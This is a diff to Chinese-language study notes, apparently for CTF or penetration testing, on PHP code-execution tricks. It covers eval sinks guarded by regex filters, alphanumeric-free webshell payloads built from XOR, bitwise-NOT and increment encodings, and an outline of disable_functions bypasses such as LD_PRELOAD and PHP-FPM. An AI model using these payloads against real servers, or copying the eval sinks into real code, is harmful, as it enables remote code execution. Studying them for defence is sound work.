@@ -350,60 +350,12 @@ echo ("X@Y");
 die();
 ```
 
-## `disable_function`绕过
-
-PHP 配置文件`php.ini`中的[disable_function](https://www.php.net/manual/zh/ini.core.php#ini.disable-functions)指令，用于禁止某些函数。接受逗号分隔的函数名列表作为参数。仅能禁用内置函数。不能影响用户自定义函数。
-
-```
-disable_functions = pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,system
-
-open_basedir=.:/proc/:/tmp/
-```
-
-### 寻找黑名单之外的未被禁用的函数
-
-### 环境变量`LD_PRELOAD`
-
-`LD_PRELOAD`是 Linux 系统中的一个环境变量，它允许用户在程序运行前定义优先加载的动态链接库（\*.so）。
-前提条件
-
-- Linux 系统
-
-- [putenv()](https://www.php.net/manual/zh/function.putenv.php)函数可用
-- mail error_log
-- 存在可写目录，需上传.so 文件
-
-<https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD>
-
-### shellshock（CVE-2014-6271）
-
-### Apache Mod CGI
-
-### PHP-FPM 利用 LD_PRELOAD 环境变量(同 1)
-
-### 攻击 PHP-FPM 监听端口
-
-### Json Serializer UAF
-
-### PHP7 GC with Certain Destructors UAF
-
-### PHP7.4 FFI 扩展执行命令
-
-### 利用 iconv 扩展执行命令
-
-### 参考资料
-
-- <https://www.freebuf.com/articles/network/263540.html>
-- <https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions>
-
-## `open_basedir`绕过
-
 ## 无字母数字
 
 ```php
 <?php
-if(!preg_match('/[a-z0-9]/is',$_GET['shell'])) {
-  eval($_GET['shell']);
+if (!preg_match('/[a-z0-9]/is', $_GET['code'])) {
+    eval($_GET['code']);
 }
 ```
 
@@ -411,9 +363,9 @@ if(!preg_match('/[a-z0-9]/is',$_GET['shell'])) {
 
 PHP 7 引入了抽象语法树（AST），与 PHP 5 在[关于间接使用变量、属性和方法的变化](https://www.php.net/manual/zh/migration70.incompatible.php)。特别说明的是，PHP 7 支持`'phpinfo'()`、`('phpinfo')()`。
 
-$_GET[_] 8 个字符
+`$_GET[_]` 8 个字符
 
-- 按位异或 XOR`^`
+### 按位异或 XOR`^`
 
 [PHP位运算符](https://www.php.net/manual/zh/language.operators.bitwise.php)中的`按位异或`，如`$a ^ $b`，当两个操作对象**都是字符串**时，将对会组成字符串的字符 ASCII 值执行操作，结果也是一个字符串。按位异或的规则是`相同为0，不同为1`。
 
@@ -473,7 +425,7 @@ ${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);
 $_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
 ```
 
-- 按位取反 Not`~`
+### 按位取反 Not`~`
 
 [PHP位运算符](https://www.php.net/manual/zh/language.operators.bitwise.php)中的`按位取反`，如`~ $a`，将$a 中为 0 的位设为 1，反之亦然。如果操作对象是字符串，则将对组成字符串的字符 ASCII 值进行取反操作，结果将会是字符串。
 
@@ -493,7 +445,7 @@ $_=~'%9E%8C%8C%9A%8D%8B';$__=~'%A0%AF%B0%AC%AB';$__=$$__;$_($__[_]);
 // $_=~'%A0%AF%B0%AC%AB';$_=$$_;(~'%9E%8C%8C%9A%8D%8B')($_[_]);
 ```
 
-- 自增
+### 自增
 
 PHP 支持[PERL字符串递增功能](https://www.php.net/manual/zh/language.operators.increment.php)，该字符串必须是字母数字 ASCII 字符串。当到达字母 Z 且递增到下个字母时，将进位到左侧值。例如，$a = 'Z'; $a++;将 $a 变为 'AA'。
 
@@ -505,7 +457,14 @@ PHP 支持[PERL字符串递增功能](https://www.php.net/manual/zh/language.ope
 $_=[].'';$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);
 ```
 
-- 过滤`$`
+### 过滤美元符号`$`
+
+```php
+<?php
+if (!preg_match('/[a-z0-9$]/i', $_GET['code'])) {
+    eval($_GET['code']);
+}
+```
 
 过滤掉`$`，将无法构造变量。
 
@@ -525,21 +484,22 @@ echo '(~' . urlencode(~$func) . ')(~' . urlencode(~$cmd) . ');'; // (~%8C%86%8C%
 ?><?=`. /???/????????[@-[]`;?>
 ```
 
-- 过滤`_`
-- 过滤`;`
+### 过滤下划线`_`
+
+### 过滤分号`;`
 
 <https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html>
 
-### 无参数
+## 无参数
 
 ```php
 <?php
 highlight_file(__FILE__);
+
 // (?R) 递归语法
 if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {    
     eval($_GET['code']);
 }
-?>
 ```
 
 `';' === preg_replace('/[^\s\(\)]+?\((?R)?\)/', '', $code)`
@@ -547,6 +507,54 @@ if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {
 正则表达式`[^\W]+\((?R)\)`匹配无参数的函数，如`a()`、`a(b())`等。
 
 - <https://xz.aliyun.com/t/10780>
+
+## `disable_function`绕过
+
+PHP 配置文件`php.ini`中的[disable_function](https://www.php.net/manual/zh/ini.core.php#ini.disable-functions)指令，用于禁止某些函数。接受逗号分隔的函数名列表作为参数。仅能禁用内置函数。不能影响用户自定义函数。
+
+```
+disable_functions = pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,mail,system
+
+open_basedir=.:/proc/:/tmp/
+```
+
+### 寻找黑名单之外的未被禁用的函数
+
+### 环境变量`LD_PRELOAD`
+
+`LD_PRELOAD`是 Linux 系统中的一个环境变量，它允许用户在程序运行前定义优先加载的动态链接库（\*.so）。
+前提条件
+
+- Linux 系统
+
+- [putenv()](https://www.php.net/manual/zh/function.putenv.php)函数可用
+- mail error_log
+- 存在可写目录，需上传.so 文件
+
+<https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD>
+
+### shellshock（CVE-2014-6271）
+
+### Apache Mod CGI
+
+### PHP-FPM 利用 LD_PRELOAD 环境变量(同 1)
+
+### 攻击 PHP-FPM 监听端口
+
+### Json Serializer UAF
+
+### PHP7 GC with Certain Destructors UAF
+
+### PHP7.4 FFI 扩展执行命令
+
+### 利用 iconv 扩展执行命令
+
+### 参考资料
+
+- <https://www.freebuf.com/articles/network/263540.html>
+- <https://github.com/AntSwordProject/AntSword-Labs/tree/master/bypass_disable_functions>
+
+## `open_basedir`绕过
 
 ## 参考资料
 
